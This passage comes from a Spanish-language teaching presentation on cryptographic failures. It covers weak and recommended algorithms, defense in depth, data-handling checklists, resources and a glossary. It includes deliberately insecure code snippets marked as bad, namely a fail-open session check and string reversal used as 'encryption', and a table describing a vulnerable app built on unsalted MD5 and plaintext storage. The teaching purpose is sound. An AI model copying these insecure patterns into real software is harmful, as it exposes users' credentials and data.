| Algoritmo | ¿Por qué es inseguro? | Reemplazo |
|-----------|----------------------|-----------|
| MD5 | Colisiones, sin salt, muy rápido | bcrypt, Argon2 |
| SHA-1 | Colisiones conocidas | SHA-256+ (solo para hashing, NO contraseñas) |
| DES | Clave de 56 bits (débil) | AES-256 |
| RC4 | Múltiples vulnerabilidades | AES-GCM, ChaCha20 |
| ECB mode | Patrones visibles | GCM, CBC con IV aleatorio |

#### Algoritmos SEGUROS (recomendados)

| Propósito | Algoritmo | Configuración |
|-----------|-----------|---------------|
| Contraseñas | bcrypt | 12+ rounds |
| Contraseñas | Argon2 | argon2id, m=65536, t=3, p=4 |
| Cifrado de datos | AES-256-GCM | IV aleatorio de 12 bytes |
| Cifrado de datos | ChaCha20-Poly1305 | Nonce aleatorio de 12 bytes |
| Tokens/sesiones | crypto.randomBytes | 32 bytes mínimo |
| Firmas digitales | ECDSA | Curva P-256 o superior |
| Intercambio de claves | ECDH | Curva X25519 |

---

### 7.2 Principios de Seguridad

#### 1. Defensa en Profundidad

No confiar en una sola capa de seguridad:

```
┌─────────────────────────────────────┐
│ HTTPS/TLS (cifrado en tránsito)    │ ← Capa 1
├─────────────────────────────────────┤
│ Headers de seguridad (Helmet)       │ ← Capa 2
├─────────────────────────────────────┤
│ Rate limiting                        │ ← Capa 3
├─────────────────────────────────────┤
│ Autenticación (tokens seguros)      │ ← Capa 4
├─────────────────────────────────────┤
│ Validación de entrada               │ ← Capa 5
├─────────────────────────────────────┤
│ Cifrado de datos sensibles (AES)    │ ← Capa 6
├─────────────────────────────────────┤
│ Contraseñas hasheadas (bcrypt)      │ ← Capa 7
├─────────────────────────────────────┤
│ Auditoría y monitoreo                │ ← Capa 8
└─────────────────────────────────────┘
```

#### 2. Principio del Mínimo Privilegio

Solo exponer lo necesario:

```javascript
// ❌ MAL: Retornar todo
res.json({ user: userData });

// ✓ BIEN: Retornar solo lo necesario
res.json({
    user: {
        id: userData.id,
        username: userData.username
        // NO incluir: password_hash, ssn, credit_card
    }
});
```

#### 3. Fail Secure (Fallar de forma segura)

En caso de error, denegar acceso:

```javascript
// ❌ MAL
try {
    verifySession(token);
} catch (e) {
    // Silenciosamente permitir acceso
}

// ✓ BIEN
try {
    verifySession(token);
} catch (e) {
    return res.status(401).json({ message: 'No autenticado' });
}
```

#### 4. No reinventar la rueda

Usar bibliotecas probadas:

```javascript
// ❌ MAL: Implementar propio cifrado
function myCrypto(password) {
    return password.split('').reverse().join('');
}

// ✓ BIEN: Usar bibliotecas estándar
const bcrypt = require('bcrypt');
bcrypt.hash(password, 12);
```

---

### 7.3 Recomendaciones por Tipo de Dato

#### Contraseñas
- ✓ bcrypt con 12+ rounds
- ✓ Validar complejidad (12+ caracteres, mayúsculas, números, especiales)
- ✓ Nunca almacenar en texto plano
- ✓ Nunca enviar por email
- ✓ Rate limiting en login
- ✓ Bloqueo tras 5 intentos fallidos

#### Números de Tarjeta de Crédito (PCI-DSS)
- ✓ Cifrar con AES-256-GCM
- ✓ Enmascarar en UI (mostrar últimos 4 dígitos)
- ✓ Nunca almacenar CVV
- ✓ Usar tokenización (Stripe, PayPal)
- ✓ Auditar todos los accesos

#### SSN / Identificaciones
- ✓ Cifrar con AES-256-GCM
- ✓ Enmascarar en APIs
- ✓ Requerir reautenticación para acceso completo
- ✓ Auditar accesos

#### Información Médica (HIPAA)
- ✓ Cifrar en reposo (AES-256-GCM)
- ✓ Cifrar en tránsito (TLS 1.3)
- ✓ Control de acceso estricto
- ✓ Auditoría completa
- ✓ Retención limitada

#### Tokens de Sesión
- ✓ crypto.randomBytes(32)
- ✓ Expiración de 24 horas
- ✓ Cookies con HttpOnly, Secure, SameSite
- ✓ Renovar tras acciones sensibles
- ✓ Invalidar al logout

---

### 7.4 Checklist Final de Implementación

#### Antes de Producción

- [ ] Todas las contraseñas usan bcrypt/Argon2
- [ ] Todos los datos sensibles cifrados (AES-256-GCM)
- [ ] Claves almacenadas en variables de entorno
- [ ] .env en .gitignore
- [ ] HTTPS configurado (TLS 1.3)
- [ ] Headers de seguridad (Helmet)
- [ ] Rate limiting en endpoints críticos
- [ ] Validación de entrada en todos los endpoints
- [ ] Cookies con flags de seguridad
- [ ] Auditoría de accesos sensibles
- [ ] Logs no contienen datos sensibles
- [ ] Manejo de errores no revela información
- [ ] Dependencias actualizadas (npm audit)
- [ ] Tests de seguridad pasando

#### Monitoreo Continuo

- [ ] Alertas de múltiples intentos fallidos
- [ ] Monitoreo de accesos a datos sensibles
- [ ] Rotación periódica de claves
- [ ] Actualización de dependencias
- [ ] Revisión de logs de auditoría
- [ ] Pruebas de penetración periódicas

---

### 7.5 Recursos Adicionales

#### Documentación Oficial
- [OWASP Top 10:2025](https://owasp.org/www-project-top-ten/)
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [Node.js Crypto Documentation](https://nodejs.org/api/crypto.html)
- [bcrypt Documentation](https://github.com/kelektiv/node.bcrypt.js)

#### Estándares y Guías
- [NIST Cryptographic Standards](https://csrc.nist.gov/projects/cryptographic-standards-and-guidelines)
- [PCI-DSS](https://www.pcisecuritystandards.org/)
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/index.html)
- [GDPR](https://gdpr.eu/)

#### Herramientas
- [Snyk](https://snyk.io/) - Escaneo de vulnerabilidades
- [OWASP ZAP](https://www.zaproxy.org/) - Testing de seguridad
- [Helmet.js](https://helmetjs.github.io/) - Headers de seguridad
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Auditoría de dependencias

#### Lecturas Recomendadas
- "Cryptography Engineering" - Ferguson, Schneier, Kohno
- "Applied Cryptography" - Bruce Schneier
- "The Web Application Hacker's Handbook" - Stuttard, Pinto

---

### 7.6 Contacto y Soporte

**Proyecto Educativo**
- Materia: Seguridad de la Información en Computación
- Tema: A04:2025 - Cryptographic Failures
- Repositorio: [GitHub](https://github.com/...)

**Reportar Issues**
- Para problemas con el código o preguntas: [Issues](https://github.com/.../issues)

---

## Apéndice A: Tabla de Comparación Completa

| Aspecto | Versión VULNERABLE | Versión SEGURA |
|---------|-------------------|----------------|
| **Hash de contraseñas** | MD5 (128 bits, sin salt) | bcrypt (12 rounds, salt único) |
| **Tiempo hash** | 0.000001 segundos | 0.25 segundos |
| **Almacenamiento datos** | Texto plano | AES-256-GCM cifrado |
| **Tokens de sesión** | MD5(userId+timestamp) | crypto.randomBytes(32) |
| **Expiración tokens** | Sin expiración | 24 horas |
| **Cookies** | Sin flags | HttpOnly, Secure, SameSite |
| **Validación contraseña** | Ninguna | 12+ chars, complejidad |
| **Rate limiting** | No | 5 intentos/15min |
| **Bloqueo de cuenta** | No | Tras 5 fallos, 15min |
| **Headers seguridad** | No | Helmet (HSTS, CSP, etc.) |
| **Enmascaramiento** | No | Datos sensibles ocultos |
| **Auditoría** | No | Completa con IP, timestamp |
| **Logging seguro** | Incluye contraseñas | No incluye datos sensibles |
| **Reautenticación** | No | Para datos sensibles |
| **HTTPS** | No (HTTP) | Recomendado (producción) |

---

## Apéndice B: Glosario

- **AES**: Advanced Encryption Standard - Estándar de cifrado simétrico
- **bcrypt**: Algoritmo de hashing para contraseñas basado en Blowfish
- **CSRF**: Cross-Site Request Forgery - Ataque de falsificación de peticiones
- **CSPRNG**: Cryptographically Secure Pseudo-Random Number Generator
- **GCM**: Galois/Counter Mode - Modo de cifrado autenticado
- **HIPAA**: Health Insurance Portability and Accountability Act
- **HMAC**: Hash-based Message Authentication Code
- **HSTS**: HTTP Strict Transport Security
- **IV**: Initialization Vector - Vector de inicialización
- **JWT**: JSON Web Token
- **MD5**: Message Digest Algorithm 5 (obsoleto)
- **MITM**: Man-in-the-Middle - Ataque de intermediario
- **OWASP**: Open Web Application Security Project
- **PCI-DSS**: Payment Card Industry Data Security Standard
- **Salt**: Datos aleatorios añadidos a contraseña antes de hashear
- **TLS**: Transport Layer Security
- **XSS**: Cross-Site Scripting

---

**FIN DE LA EXPOSICIÓN**

---

*Este documento fue generado como material educativo para demostrar vulnerabilidades criptográficas y sus soluciones. La versión vulnerable del código es SOLO para propósitos educativos y NUNCA debe usarse en producción.*
